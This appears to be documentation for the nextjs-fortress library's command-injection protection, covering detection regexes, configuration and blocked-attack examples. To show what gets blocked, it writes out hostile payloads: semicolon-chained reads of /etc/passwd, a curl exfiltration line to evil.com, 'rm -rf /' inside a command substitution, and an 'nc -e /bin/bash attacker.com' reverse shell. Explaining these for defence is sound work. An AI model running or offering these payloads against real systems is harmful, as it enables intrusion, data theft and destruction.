# Command Injection Protection

## Overview

Command injection protection detects and blocks malicious shell commands in payloads that could execute arbitrary commands on the server operating system.

## Why This Is Important

### The Problem: Command Injection Attacks

Attackers inject shell commands to execute arbitrary code on the server:

#### 1. **Shell Metacharacter Injection**

```javascript
// File upload with malicious filename
{
  "filename": "document.pdf; cat /etc/passwd"
}

// Without protection, if app uses:
exec(`convert ${filename} output.jpg`);
// Executes: convert document.pdf; cat /etc/passwd output.jpg
// Result: Password file exposed
```

**What Happens Without Protection:**
- Shell commands executed
- System files accessed
- Credentials exposed

**Impact:**
- 📁 File system access
- 🔑 Credential theft
- 💣 System compromise
- 🎭 Privilege escalation

#### 2. **Pipe Command Injection**

```javascript
// Search query with pipe
{
  "query": "logs | grep password | curl evil.com -d @-"
}

// Without protection:
exec(`cat logs.txt | grep "${query}"`);
// Executes: cat logs.txt | grep "logs | grep password | curl evil.com -d @-"
// Result: Passwords sent to attacker
```

**What Happens Without Protection:**
- Pipe commands chain operations
- Data exfiltrated
- Remote server receives data

**Impact:**
- 📡 Data exfiltration
- 🕵️ Silent attacks
- 🔓 Credential leakage
- 💾 Database dumps

#### 3. **Command Substitution**

```javascript
// Backup path with substitution
{
  "path": "$(rm -rf /)"
}

// Without protection:
exec(`backup ${path}`);
// Executes: backup $(rm -rf /)
// Result: Entire filesystem deleted
```

**What Happens Without Protection:**
- Command substitution executes first
- Destructive commands run
- System destroyed

**Impact:**
- 💥 File system destruction
- 🗑️ Data deletion
- 📉 Service outage
- 💸 Business loss

#### 4. **Reverse Shell**

```javascript
// Malicious webhook URL
{
  "webhook": "http://example.com; nc -e /bin/bash attacker.com 4444"
}

// Without protection:
exec(`curl ${webhook}`);
// Executes: curl http://example.com; nc -e /bin/bash attacker.com 4444
// Result: Shell access to attacker
```

**What Happens Without Protection:**
- Reverse shell established
- Attacker gains shell access
- Full server control

**Impact:**
- 🔓 Complete server compromise
- 👑 Root access possible
- 🎯 Persistent backdoor
- 🌐 Network pivot point

## How nextjs-fortress Solves This

### Detection Patterns

```typescript
export const COMMAND_PATTERNS = [
  /[;&|`$(){}[\]<>]/,                    // Shell metacharacters
  /(bash|sh|cmd|powershell|exec|spawn)/gi, // Shell executables
  /(\|\s*cat\s+)/gi,                     // Pipe to cat
  /(>\s*\/dev\/null)/gi,                 // Output redirection
  /(\$\(.*\))/g,                          // Command substitution
  /(wget|curl).*http/gi,                  // Remote code fetching
  /(nc|netcat).*-e/gi,                    // Reverse shells
];
```

### The Algorithm

```typescript
/**
 * Check a string against command injection patterns
 */
private checkPatterns(
  str: string,
  patterns: RegExp[],
  type: string
): ValidationResult {
  for (const pattern of patterns) {
    pattern.lastIndex = 0;
    const match = pattern.exec(str);

    if (match) {
      return {
        valid: false,
        severity: 'critical',
        message: `Command injection detected: "${match[0]}"`,
        rule: 'command_injection',
        pattern: match[0],
        confidence: 0.9,
      };
    }
  }

  return { valid: true };
}
```

## Configuration

### Basic Setup

```typescript
import { FortressConfig } from 'nextjs-fortress';

export const fortressConfig: FortressConfig = {
  modules: {
    injection: {
      enabled: true,
      checks: ['command'], // Enable command injection detection
    },
  },
};
```

### With All Injection Types

```typescript
export const fortressConfig: FortressConfig = {
  modules: {
    injection: {
      enabled: true,
      checks: ['sql', 'command', 'xss', 'codeInjection'],
    },
  },
};
```

### With Custom Patterns

```typescript
export const fortressConfig: FortressConfig = {
  modules: {
    injection: {
      enabled: true,
      checks: ['command'],
      customPatterns: [
        /\bsudo\b/gi,           // Sudo commands
        /\brm\s+-rf/gi,         // Force remove
        /\bkill\b.*-9/gi,       // Kill processes
        /\bchmod\b.*777/gi,     // Permission changes
      ],
    },
  },
};
```

## Attack Examples

### Example 1: Semicolon Command Chaining

```javascript
// File processing request
POST /api/process
{
  "file": "report.pdf; cat /etc/passwd"
}

// Fortress detects:
// Pattern match: ";" found
// Severity: critical
// Result: BLOCKED ✅
```

### Example 2: Pipe Data Exfiltration

```javascript
// Log search request
POST /api/logs/search
{
  "term": "error | curl https://evil.com -d @-"
}

// Fortress detects:
// Pattern match: "|" and "curl" found
// Result: BLOCKED ✅
```

### Example 3: Command Substitution

```javascript
// Backup path
POST /api/backup
{
  "destination": "$(whoami)"
}

// Fortress detects:
// Pattern match: "$(...)" found
// Result: BLOCKED ✅
```

### Example 4: Reverse Shell

```javascript
// Webhook callback
POST /api/webhook
{
  "url": "http://site.com; nc -e /bin/bash attacker.com 4444"
}

// Fortress detects:
// Pattern match: ";" and "nc -e" found
// Result: BLOCKED ✅
```

## Shell Metacharacters Blocked

```typescript
// These characters enable command chaining and injection
;   // Command separator
&   // Background execution
|   // Pipe to another command
`   // Command substitution (backticks)
$   // Variable/command substitution
()  // Subshell execution
{}  // Brace expansion
[]  // Character class
<>  // Input/output redirection
```

## How to Initialize

```typescript
import { FortressConfig, FortressLogger } from 'nextjs-fortress';

export const fortressConfig: FortressConfig = {
  enabled: true,
  mode: 'development',

  modules: {
    injection: {
      enabled: true,
      checks: ['command'],
    },
  },

  onSecurityEvent: async (event) => {
    if (event.detection.rule === 'command_injection') {
      const logger = new FortressLogger({
        enabled: true,
        level: 'warn',
        destination: 'console',
      });

      logger.warn('⚡ Command Injection Blocked', {
        pattern: event.detection.pattern,
        ip: event.request.ip,
        path: event.request.path,
      });
    }
  },
};
```

## Performance Impact

```typescript
// Test: 1000 requests

Without command detection:   0.1ms per request
With command detection:      0.2ms per request
Overhead:                   +0.1ms per request
```

## Summary

**What happens without command injection protection:**
- Arbitrary command execution
- File system access
- Data exfiltration
- Complete server compromise

**What nextjs-fortress provides:**
- Metacharacter detection
- Shell command blocking
- Substitution prevention
- Reverse shell protection

**How to initialize:**
```typescript
injection: {
  enabled: true,
  checks: ['command'],
}
```

---

**Related Documentation:**
- [SQL Injection Protection](./sql-injection.md)
- [XSS Protection](./xss-protection.md)
- [Code Injection Protection](./code-injection.md)